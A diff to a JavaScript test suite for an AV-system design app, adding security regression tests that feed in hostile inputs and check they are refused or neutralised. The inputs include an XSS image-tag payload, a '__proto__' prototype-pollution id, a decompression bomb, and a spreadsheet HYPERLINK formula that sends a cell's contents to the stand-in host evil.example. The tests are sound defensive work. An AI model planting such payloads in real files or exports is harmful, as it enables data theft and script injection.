@@ -887,6 +887,27 @@ for (const [name, raw] of Object.entries(fixtures)) routed[name] = routerChecks(
       t("receivers: the drawn tile says the room on top and the product under it (Loft · Anthem MRX 540)", />Loft</.test(tile(avr540)) && />Anthem MRX 540</.test(tile(avr540))); }
     t("receivers: the AI's job summary says which room each drives", /MRX 1140 — AV receiver driving Theater/.test((await import("./ai.js")).jobSummary(j, 0, CATn)));
   }
+  { // security review 2026-10-03: each finding's own exploit, now harmless
+    const Lib = await import("./library.js"), Im2 = await import("./importers.js"), Cm2 = await import("./commands.js"), Pg = await import("./pages.js");
+    const evil = { kind: "signalpath-library", devices: { "evil-amp": { type: "amp", brand: "X", model: "Y", zones: "8<img src=x onerror=alert(1)>" } } };
+    const devs = {}; Lib.applyImport(devs, evil, Lib.planImport(devs, evil, JSON.stringify));
+    t("security: a library device's numeric field can't carry markup (\"zones\": \"8<img …>\" is dropped)", !("zones" in devs["evil-amp"]) || typeof devs["evil-amp"].zones === "number", JSON.stringify(devs["evil-amp"]));
+    const bad = structuredClone(await (await fetch("../mock-system-residence.json")).json());
+    bad.house.zones[0].id = "__proto__";
+    let threw = false; try { Im2.assertJobShape(Im2.stripUnsafe(bad)); } catch { threw = true; }
+    t("security: a job whose room id is \"__proto__\" is refused at import (it polluted every object in the app)", threw && ({}).remote === undefined);
+    const p1 = Cm2.planCommands(bad.house ? await (await fetch("../mock-system-residence.json")).json() : {}, 0, [{ op: "constructor" }, { op: "toString" }], {});
+    t("security: \"constructor\" / \"toString\" aren't commands", p1.steps.every(x => !x.ok));
+    const js = await (await fetch("../mock-system-residence.json")).json();
+    const d0 = js.solutions[0].racks[0].devices[0]; d0.status = '=HYPERLINK("http://evil.example/?"&A1,"open")';
+    const Ljs = loadJob(js), csv = Pg.takeoffCSV(Ljs.job, Ljs.ix);
+    t("security: a status can't become a spreadsheet formula in the takeoff CSV", !/(^|\n)=/.test(csv) && !/,=/.test(csv), csv.split("\n").find(l => /HYPERLINK/i.test(l)));
+    const bomb = await Im2.encodeHandoff({ rooms: [{ name: "x".repeat(6e6) }] });
+    let capped = ""; try { await Im2.decodeHandoff("#avwalk=" + bomb); } catch (e) { capped = e.message; }
+    t("security: an AVWalk link that inflates past 5 MB is refused (decompression bomb)", /far more than a survey/.test(capped), capped);
+    const ok = await Im2.decodeHandoff("#avwalk=" + await Im2.encodeHandoff({ rooms: [{ name: "Kitchen" }] }));
+    t("security: a normal AVWalk link still opens", ok?.rooms?.[0]?.name === "Kitchen");
+  }
   { // picker audit fixes (2026-10-03): names that don't grow, twins told apart, full amps, areas, encoders, no vanishing wires
     const Nn = await import("./names.js"), Cm = await import("./commands.js"), Hk = await import("./hookup.js"), Sk = await import("./starters.js"), Im = await import("./importers.js");
     const CATp = await (await fetch("./catalog.json")).json();
